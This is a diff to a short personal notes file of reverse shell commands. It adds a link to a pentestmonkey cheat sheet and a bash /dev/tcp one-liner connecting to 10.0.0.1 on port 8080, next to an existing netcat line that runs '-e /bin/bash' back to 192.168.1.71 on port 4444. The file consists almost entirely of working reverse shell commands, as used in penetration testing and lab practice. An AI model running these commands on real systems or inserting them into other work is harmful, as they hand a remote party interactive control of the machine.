@@ -1,5 +1,10 @@
 # Reverse shell scripts
 
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+## Using shell
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
 ## Using Netcat
 cmd=nc -nv 192.168.1.71 4444 -e /bin/bash  
 
